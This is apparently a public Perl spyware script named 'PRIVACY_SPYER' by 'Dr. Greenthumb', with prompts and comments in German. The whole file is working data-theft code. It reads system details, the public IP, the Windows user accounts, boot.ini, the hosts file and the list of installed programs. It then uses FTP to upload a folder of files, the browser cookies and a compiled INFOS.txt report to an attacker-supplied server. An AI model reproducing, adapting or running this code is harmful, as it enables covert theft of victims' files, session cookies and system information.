#!/usr/bin/perl
####################################
# I WILL SPY YOU                                 DR.GREENTHUMB #
# ###################################
#                                                                                     #                                                           
# [+] File upload                                                                #                                   
# [+] System Infos                                                            #                                       
# [+] IP Adresse                                                                #                                      
# [+] Cookie upload                                                             #                                    
# [+] boot.ini upload                                                           #                                  
# [+] hosts.dat auslesen                                                      #                                
# [+] Userlist                                                                   # 
#                                                                                     #    
####################################                                                           

use Net::FTP;
use LWP::UserAgent;
use Color::Output;
Color::Output::Init;

cprint "\x036
=========================================
PRIVACY_SPYER / DR. GREENTHUMB

Name: Dr. Greenthumb
Version: 2.0
Coder: Perforin
Status: Public
Greetz: dark-codez.org
=========================================
\n\n\n\x030";

Server();
sub Server {
cprint "\x0313FTP Server:"."\n";
$url = <STDIN>; # Input FTP Server
chop($url);
print "User:"."\n";
$user = <STDIN>; # Input Login Name
chop($user);
print "Passwort:"."\n";
$pw = <STDIN>; # Input Server PW
chop($pw);
cprint "Pfad der Dateien:"."\n"."\n";
$path = <STDIN>; # The Path to the Files
chop($path);
cprint "\x030"."\n";
$getTHEip = 'http://www.wieistmeineip.de/'; # Shows the IP
$count1 = 0; # Counter1
$count2 = 0; # Counter2
$count3 = 0; # Counter3

Infos();
sub Infos {

($sec,$min,$hour,$mday,$mon,$year,$wday,$ydat,$isdst)=localtime();
             $jahr=$year;
             $monat=$mon+1;
             $tag=$mday;
             $jahr=$year;

$jahr=$year +1900;

if (length($monat) == 1)
{
    $monat="0$monat";
}
if(length($tag) == 1)
{
   $tag="0$tag";
}
if(length($hour) == 1)
{
   $hour="0$hour";
}
if(length($min) == 1)
{
   $min="0$min";
}
if(length($sec) == 1)
{
   $sec="0$sec";
}

$Xdatum=$tag.".".$monat.".".$jahr;
$Xzeit=$hour.":".$min.":".$sec;
cprint "\x0313OS: $^O"."\n";
print "Datum: $Xdatum"."\n";
print "Zeit: $Xzeit"."\n";
cprint "\x0313Benutzer ID: $<"."\x030"."\n";
$agent = new LWP::UserAgent;
$request = HTTP::Request->new('GET',$getTHEip);
$result = $agent->request($request);
$getTHEip =~ s/.*\///;
$getTHEip = 'ip.txt';
open(lookME, ">$getTHEip");
print lookME $result->content();
close(lookME);
$need = "ip.txt";
open(IN,"<$need") || cprint "\x035NOT FOUND BIATCH!\x030"."\n";
@IN = <IN>;
close(IN);
@IN2 = @IN[50..300];
@iplist = ();
foreach $line(@IN2){
 if($line =~ /(\d+\.\d+\.\d+\.\d+)/){
 cprint "\x0313IP Adresse: $1"."\x030"."\n";
   push(@iplist, $1);
 }
}
chdir "C:\\Dokumente und Einstellungen";
@Konten = ();
foreach $localuser (<*>) {
push(@Konten, "$localuser");
}
cprint "\x0313Konten: @Konten"."\x030"."\n"."\n";
}
Main();
sub Main {
chdir "$path";
$ftp = Net::FTP->new("$url", Debug => 0) || cprint "\x035Server down!\x030"."\n";
$ftp->login("$user","$pw") || cprint "\x035Benutzer oder Kennwort falsch!\x030"."\n";
foreach $file (<*>) {
 if ($file =~ /.txt|.log|.html|.php/)	{ 
		$ftp->type(A);
	} else { 
		$ftp->type(I);
	}
$ftp->put ($file);
$count1++;
}
$ftp->close;
cprint "\x0313[+] Filez geupped!"."\x030"."\n";

chdir "C:\\Dokumente und Einstellungen\\Default User\\Cookies";

$ftp = Net::FTP->new("$url", Debug => 0) || cprint "\x035Server down!\x030"."\n";
$ftp->login("$user","$pw") || cprint "\x035Benutzer oder Kennwort falsch!\x030"."\n";
foreach $cookie (<*.*>) {
 if ($cookie =~ /.txt|.log|.html|.php/)	{ 
		$ftp->type(A);
	} else { 
		$ftp->type(I);
	}
$ftp->put ($cookie);
$count2++;
}
$ftp->close;

cprint "\x0313[+] Cookies geupped!"."\n";

chdir "\\";
open(BOOT, "<boot.ini");
@bootme = <BOOT>;
close(BOOT);
cprint "\x0313[+] BOOT.INI ausgelesen!"."\n";

chdir "C:\\Windows\\System32\\drivers\\etc";
open(HOSTS, "<hosts");
@hostme = <HOSTS>;
close(HOSTS);
@hostme = @hostme[18...999];

cprint "\x0313[+] HOSTS.DAT ausgelesen!"."\x030"."\n";

chdir "C:\\Users\\Sam";
open(INFOS, ">INFOS.txt");
print INFOS "====================================="."\n";
print INFOS "Created by DR. GREENTHUMB"."\n";
print INFOS "====================================="."\n";
print INFOS "\n"."OS: $^O"."\n";
print INFOS "Datum: $Xdatum"."\n";
print INFOS "Zeit: $Xzeit"."\n";
print INFOS "Konten: @Konten"."\n";
print INFOS "Benutzer ID: $<"."\n";
print INFOS "IP Adresse: @iplist"."\n"."\n";
print INFOS "===============COOKIES==============="."\n";
print INFOS "\n"."Gefundene Cookies: $count2"."\n"."\n";
print INFOS "====================================="."\n"."\n";
print INFOS "=============UPPED FILEZ============="."\n";
print INFOS "\n"."Gefundene Filez:  $count1"."\n"."\n";
print INFOS "====================================="."\n"."\n";
print INFOS "===============BOOT.INI==============="."\n";
print INFOS "\n"."@bootme"."\n"."\n";
print INFOS "====================================="."\n"."\n";
print INFOS "================HOSTS================"."\n";
print INFOS "\n"." @hostme"."\n"."\n";
print INFOS "====================================="."\n"."\n";
print INFOS "==============PROGRAMME=============="."\n"."\n";
chdir "C:\\Program Files";
foreach $ordner (<*>) {
print INFOS $ordner."\n";
}
print INFOS "\n";
cprint "\x0313[+] Programme ausgelesen!"."\x030"."\n";
chdir "C:\\Users\\Sam";
print INFOS "====================================="."\n"."\n";
close(INFOS);
sleep (2);
$info = "INFOS.txt";
$ftp = Net::FTP->new("$url", Debug => 0) || cprint "\x035Server down!\x030"."\n";
$ftp->login("$user","$pw") || cprint "\x035Benutzer oder Kennwort falsch!\x030"."\n";
$ftp->type(A);
$ftp->put ($info);
$ftp->close;
cprint "\x0313[+] INFOS.TXT geupped!"."\x030"."\n";
}
}